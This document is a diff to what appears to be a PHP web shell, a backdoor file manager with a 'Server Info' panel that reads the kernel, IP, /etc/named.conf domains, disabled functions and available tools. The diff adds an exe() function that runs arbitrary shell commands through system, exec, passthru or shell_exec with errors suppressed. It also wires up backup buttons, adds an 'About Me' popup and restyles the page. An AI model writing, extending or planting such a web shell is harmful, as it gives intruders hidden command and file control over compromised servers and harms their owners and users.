@@ -220,24 +220,48 @@ class XN {
             return DIRECTORY_SEPARATOR;
         }
     }
+    public static function exe($cmd) {
+        if(function_exists('system')) {         
+            @ob_start();        
+            @system($cmd);      
+            $buff = @ob_get_contents();         
+            @ob_end_clean();        
+            return $buff;   
+        } elseif(function_exists('exec')) {         
+            @exec($cmd,$results);       
+            $buff = "";         
+            foreach($results as $result) {          
+                $buff .= $result;       
+            } return $buff;     
+        } elseif(function_exists('passthru')) {         
+            @ob_start();        
+            @passthru($cmd);        
+            $buff = @ob_get_contents();         
+            @ob_end_clean();        
+            return $buff;   
+        } elseif(function_exists('shell_exec')) {       
+            $buff = @shell_exec($cmd);      
+            return $buff;   
+        } 
+    }
     public static function color($bold = 1, $colorid = null, $string = null) {
-    	$color = array(
-			"</font>",  			# 0 off
-			"<font color='red'>",	# 1 red 
-			"<font color='lime'>",	# 2 lime
-			"<font color='white'>",	# 3 white
-			"<font color='gold'>",	# 4 gold
-		);  return ($string !== null) ? $color[$colorid].$string.$color[0]: $color[$colorid];
-	}
+        $color = array(
+            "</font>",              # 0 off
+            "<font color='red'>",   # 1 red 
+            "<font color='lime'>",  # 2 lime
+            "<font color='white'>", # 3 white
+            "<font color='gold'>",  # 4 gold
+        );  return ($string !== null) ? $color[$colorid].$string.$color[0]: $color[$colorid];
+    }
     public static function lib_installed() {
-    	$lib[] = "MySQL: ".(function_exists('mysql_connect') ? self::color(1, 2, "ON") : self::color(1, 1, "OFF"));
-		$lib[] = "cURL:  ".(function_exists('curl_version') ? self::color(1, 2, "ON") : self::color(1, 1, "OFF"));
-		$lib[] = "Wget:  ".(system('wget --help') ? self::color(1, 2, "ON") : self::color(1, 1, "OFF"));
-		$lib[] = "Perl:  ".(system('perl --help') ? self::color(1, 2, "ON") : self::color(1, 1, "OFF"));
-		$lib[] = "Mail:  ".(function_exists('mail') ? self::color(1, 2, "ON") : self::color(1, 1, "OFF"));
-		$lib[] = "Python: ".(system('python --help') ? self::color(1, 2, "ON") : self::color(1, 1, "OFF"));
-		return implode(" | ", $lib);
-	}
+        $lib[] = "MySQL: ".(function_exists('mysql_connect') ? self::color(1, 2, "ON") : self::color(1, 1, "OFF"));
+        $lib[] = "cURL:  ".(function_exists('curl_version') ? self::color(1, 2, "ON") : self::color(1, 1, "OFF"));
+        $lib[] = "Wget:  ".(self::exe('wget --help') ? self::color(1, 2, "ON") : self::color(1, 1, "OFF"));
+        $lib[] = "Perl:  ".(self::exe('perl --help') ? self::color(1, 2, "ON") : self::color(1, 1, "OFF"));
+        $lib[] = "Mail:  ".(function_exists('mail') ? self::color(1, 2, "ON") : self::color(1, 1, "OFF"));
+        $lib[] = "Python: ".(self::exe('python --help') ? self::color(1, 2, "ON") : self::color(1, 1, "OFF"));
+        return implode(" | ", $lib);
+    }
     public static function info($info = null) {
         switch ($info) {
             case 'disable_function':
@@ -259,12 +283,12 @@ class XN {
                 return phpversion();
                 break;
             case 'safe_mode':
-            	return (@ini_get(strtoupper("safe_mode")) === "ON" ? "<font color='red'>ON</font>" : 
-            								"<font color='green'>OFF</font>");
-            	break;
+                return (@ini_get(strtoupper("safe_mode")) === "ON" ? "<font color='red'>ON</font>" : 
+                                            "<font color='green'>OFF</font>");
+                break;
             case 'lib':
-            	return self::lib_installed();
-            	break;
+                return self::lib_installed();
+                break;
             case 'domain':
                 $d0mains = @file("/etc/named.conf", false);
                 if (!$d0mains){
@@ -794,6 +818,16 @@ function head($x, $y, $class = null) {
                     </button>
                 </li>
                 <li>
+                    <button type="button" class="open">
+                        <div class="icon">
+                            <a><i class="fa fa-info-circle" aria-hidden="true"></i></a>
+                        </div>
+                        <div class="font">
+                            About Me
+                        </div>
+                    </button>
+                </li>
+                <li>
                     <button>
                         <div class="icon">
                             <a><i class="fa fa-power-off" aria-hidden="true"></i></a>
@@ -808,6 +842,19 @@ function head($x, $y, $class = null) {
         </ul>
         <div class="mobile">
             <input class="<?= $class ?>" type="text" id="Input" onkeyup="filterTable()" placeholder="Search some files..." title="Type in a name">
+        </div>
+        <div class="container">
+            <div class="box">
+                <button class="close">X</button>
+                <h2>
+                    <i class="fa fa-info-circle"></i>
+                    About Me
+                </h2>
+                <p>Lorem ipsum dolor sit amet consectetur.</p>
+                <p>Lorem ipsum dolor sit amet consectetur.</p>
+                <p>Lorem ipsum dolor sit amet consectetur.</p>
+                <p>Lorem ipsum dolor sit amet consectetur.</p>
+            </div>
         </div>
     </div>
     <?php
@@ -884,6 +931,7 @@ function alert($message) {
         color: #666;
     }
     .storage span.title {
+        color: #000;
         font-size: 23px;
         font-weight:bold;
     }
@@ -1026,6 +1074,18 @@ function alert($message) {
     .edit {
         padding-left: 25px;
         padding-right: 25px;
+    }
+    .info table {
+        width:100%;
+        overflow: hidden;
+        word-break:break-all;
+    }
+    .info table td.info {
+        width:125px;
+    }
+    .info .engine {
+        width:auto;
+        overflow-x: auto;
     }
     .info table td,
     .config table td,
@@ -1284,25 +1344,26 @@ function alert($message) {
         color: #1889f5;
     }
     ::-webkit-scrollbar {
-        display: none;
+        width: 12px;
     }
     ::-webkit-scrollbar-track {
-        background: blue;
+        background: #fff;
     }
     ::-webkit-scrollbar-thumb {
-        background: var(--color-bg);
-        border-radius:0;
+        background: #ebebeb;
+        border-radius: 20px;
+        border:3px solid #fff;
     }
     ::-webkit-scrollbar-thumb:hover {
         background: #dfeaf5;
     }
     .jqx-alert  {  
         margin-top: -200px;
-        position: absolute;  
+        position: absolute;
         overflow: hidden;  
         border-radius:10px;
         box-shadow: 0 0 3px rgba(0,0,0,0.16), 0 3px 6px rgba(0,0,0,0.23);
-        z-index: 99999;  
+        z-index: 99999;
      }  
     .jqx-alert-header   {  
         font-weight: bold;
@@ -1406,10 +1467,50 @@ function alert($message) {
         background-position:center center;
         background-image:url('data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAADwAAAA8CAYAAAA6/NlyAAAAAXNSR0IArs4c6QAAA3hJREFUaAXlm8+K00Acx7MiCIJH/yw+gA9g25O49SL4AO3Bp1jw5NvktC+wF88qevK4BU97EmzxUBCEolK/n5gp3W6TTJPfpNPNF37MNsl85/vN/DaTmU6PknC4K+pniqeKJ3k8UnkvDxXJzzy+q/yaxxeVHxW/FNHjgRSeKt4rFoplzaAuHHDBGR2eS9G54reirsmienDCTRt7xwsp+KAoEmt9nLaGitZxrBbPFNaGfPloGw2t4JVamSt8xYW6Dg1oCYo3Yv+rCGViV160oMkcd8SYKnYV1Nb1aEOjCe6L5ZOiLfF120EjWhuBu3YIZt1NQmujnk5F4MgOpURzLfAwOBSTmzp3fpDxuI/pabxpqOoz2r2HLAb0GMbZKlNV5/Hg9XJypguryA7lPF5KMdTZQzHjqxNPhWhzIuAruOl1eNqKEx1tSh5rfbxdw7mOxCq4qS68ZTjKS1YVvilu559vWvFHhh4rZrdyZ69Vmpgdj8fJbDZLJpNJ0uv1cnr/gjrUhQMuI+ANjyuwftQ0bbL6Erp0mM/ny8Fg4M3LtdRxgMtKl3jwmIHVxYXChFy94/Rmpa/pTbNUhstKV+4Rr8lLQ9KlUvJKLyG8yvQ2s9SBy1Jb7jV5a0yapfF6apaZLjLLcWtd4sNrmJUMHyM+1xibTjH82Zh01TNlhsrOhdKTe00uAzZQmN6+KW+sDa/JD2PSVQ873m29yf+1Q9VDzfEYlHi1G5LKBBWZbtEsHbFwb1oYDwr1ZiF/2bnCSg1OBE/pfr9/bWx26UxJL3ONPISOLKUvQza0LZUxSKyjpdTGa/vDEr25rddbMM0Q3O6Lx3rqFvU+x6UrRKQY7tyrZecmD9FODy8uLizTmilwNj0kraNcAJhOp5aGVwsAGD5VmJBrWWbJSgWT9zrzWepQF47RaGSiKfeGx6Szi3gzmX/HHbihwBser4B9UJYpFBNX4R6vTn3VQnez0SymnrHQMsRYGTr1dSk34ljRqS/EMd2pLQ8YBp3a1PLfcqCpo8gtHkZFHKkTX6fs3MY0blKnth66rKCnU0VRGu37ONrQaA4eZDFtWAu2fXj9zjFkxTBOo8F7t926gTp/83Kyzzcy2kZD6xiqxTYnHLRFm3vHiRSwNSjkz3hoIzo8lCKWUlg/YtGs7tObunDAZfpDLbfEI15zsEIY3U/x/gHHc/G1zltnAgAAAABJRU5ErkJggg==')
     }
+    .container {
+        display: none;
+    }
+    .box {
+        width: 300px;
+        font-weight: normal;
+        position: absolute;
+        background-color: #FFF;
+        border: 2px solid #fff;
+        border-radius: 7px;
+        box-shadow: 0 0 3px rgba(0,0,0,0.16), 0 3px 6px rgba(0,0,0,0.23);
+        padding-left: 20px;
+        padding-right:20px;
+        z-index: 999;
+    }
+    .close {
+        position: absolute;
+        top: -20px;
+        right: -20px;
+        border:none;
+        box-shadow: 0 0 3px rgba(0,0,0,0.16), 0 3px 6px rgba(0,0,0,0.23);
+        border-radius: 50%;
+        background-color: #FFF;
+        color: #F08;
+        padding: 10px 18px;
+        font-size: 1em;
+        outline: none;
+        cursor: pointer;
+        transition: all 0.3s ease-in-out;
+    } 
+    .close:hover {
+        background-color: #F08;
+        color: #FFF;
+    }
+    .box > h2 {
+        text-align: left;
+    }
     @media (min-width: 320px) and (max-width: 480px) {
         body {
             background: #fff;
             margin: 0;
+        }
+        ::-webkit-scrollbar {
+            display: none;
         }
         .mobile {
             padding-left:25px;
@@ -1485,7 +1586,7 @@ function alert($message) {
         }
     }
 </style>
-<script src="https://code.jquery.com/jquery-3.3.1.js"></script>
+<script src="https://code.jquery.com/jquery-3.3.1.min.js"></script>
 <script type="text/javascript" src="http://code.jquery.com/jquery-1.7.2.min.js"></script>
 <script src="https://cdnjs.cloudflare.com/ajax/libs/jquery/3.0.0/jquery.min.js"></script>
 <script src="https://cdnjs.cloudflare.com/ajax/libs/jquery-modal/0.9.1/jquery.modal.min.js"></script>
@@ -1546,6 +1647,19 @@ function filterTable() {
         }
     }
 }
+</script>
+<script type="text/javascript">
+ $(document).ready(function() {
+     $(".open").on("click", function() {
+       $(".container").fadeIn();
+       $(".open").fadeOut();
+     });
+
+     $(".close").on("click", function() {
+       $(".container").fadeOut();
+       $(".open").fadeIn();
+     });
+ });
 </script>
 <script type="text/javascript">  
     jqxAlert = {  
@@ -1631,83 +1745,97 @@ function filterTable() {
             }
             break;
         case 'info':
-        	head('Server Info', getcwd(), 'hidden');
-        	?>
-        	<div class="info">
-        		<table>
-        			<tr>
-        				<td>
-        					Kernel
-        				</td>
-        				<td>:</td>
-        				<td>
-        					<?= XN::info('kernel') ?>
-        				</td>
-        			</tr>
-        			<tr>
-        				<td>
-        					Software
-        				</td>
-        				<td>:</td>
-        				<td>
-        					<?= XN::info('software') ?>
-        				</td>
-        			</tr>
-        			<tr>
-        				<td>
-        					IP
-        				</td>
-        				<td>:</td>
-        				<td>
-        					<?= XN::info('ip') ?>
-        				</td>
-        			</tr>
-        			<tr>
-        				<td>
-        					PHP Version
-        				</td>
-        				<td>:</td>
-        				<td>
-        					<?= XN::info('phpversion') ?>
-        				</td>
-        			</tr>
-        			<tr>
-        				<td>
-        					Domains
-        				</td>
-        				<td>:</td>
-        				<td>
-        					<?= XN::info('domain') ?>
-        				</td>
-        			</tr>
-        			<tr>
-        				<td>
-        					Disable Function
-        				</td>
-        				<td>:</td>
-        				<td>
-        					<?= XN::info('disable_function') ?>
-        				</td>
-        			</tr>
-        			<tr>
-        				<td>
-        					Safe Mode
-        				</td>
-        				<td>:</td>
-        				<td>
-        					<?= XN::info('safe_mode') ?>
-        				</td>
-        			</tr>
-        			<tr>
-        				<td colspan="3">
-        					<?= XN::info('lib') ?>
-        				</td>
-        			</tr>
-        		</table>
-        	</div>
-        	<?php
-        	exit();
-        	break;
+            head('Server Info', getcwd(), 'hidden');
+            ?>
+            <div class="info">
+                <table>
+                    <tr>
+                        <td class="info">
+                            Kernel
+                        </td>
+                        <td>:</td>
+                        <td>
+                            <div class="engine">
+                                <?= XN::info('kernel') ?>
+                            </div>
+                        </td>
+                    </tr>
+                    <tr>
+                        <td class="info">
+                            Software
+                        </td>
+                        <td>:</td>
+                        <td>
+                            <div class="engine">
+                                <?= XN::info('software') ?>
+                            </div>
+                        </td>
+                    </tr>
+                    <tr>
+                        <td class="info">
+                            IP
+                        </td>
+                        <td>:</td>
+                        <td>
+                            <div class="engine">
+                                <?= XN::info('ip') ?>
+                            </div>
+                        </td>
+                    </tr>
+                    <tr>
+                        <td class="info">
+                            PHP Version
+                        </td>
+                        <td>:</td>
+                        <td>
+                            <div class="engine">
+                                <?= XN::info('phpversion') ?>
+                            </div>
+                        </td>
+                    </tr>
+                    <tr>
+                        <td class="info">
+                            Domains
+                        </td>
+                        <td>:</td>
+                        <td>
+                            <div class="engine">
+                                <?= XN::info('domain') ?>
+                            </div>
+                        </td>
+                    </tr>
+                    <tr>
+                        <td class="info">
+                            Disable Function
+                        </td>
+                        <td>:</td>
+                        <td>
+                            <div class="engine">
+                                <?= XN::info('disable_function') ?>
+                            </div>
+                        </td>
+                    </tr>
+                    <tr>
+                        <td class="info">
+                            Safe Mode
+                        </td>
+                        <td>:</td>
+                        <td>
+                            <div class="engine">
+                                <?= XN::info('safe_mode') ?>
+                            </div>
+                        </td>
+                    </tr>
+                    <tr>
+                        <td class="info" colspan="3">
+                            <?= XN::info('lib') ?>
+                        </td>
+                    </tr>
+                </table>
+            </div>
+            <?php
+            exit();
+            break;
         case 'backup':
             if (XN::save($_POST['file'].".bak", file_get_contents($_POST['file']))) {
                 alert('failed');
@@ -2014,7 +2142,7 @@ function filterTable() {
                                                 <button name="action" value="edit">Edit</button>
                                                 <button name="action" value="delete">Delete</button>
                                                 <button disabled>Rename</button>
-                                                <button>Backup</button>
+                                                <button name="action" value="backup">Backup</button>
                                                 <?php
                                                 break;
                                         }
@@ -2091,7 +2219,7 @@ function filterTable() {
                                 <button disabled>Edit</button>
                                 <button name="action" value="delete">Delete</button>
                                 <button name="action" value="rename">Rename</button>
-                                <button>Backup</button>
+                                <button name="action" value="backup">Backup</button>
                             </td>
                             <input type="hidden" name="file" value="<?= $_POST['file'] ?>">
                         </form>
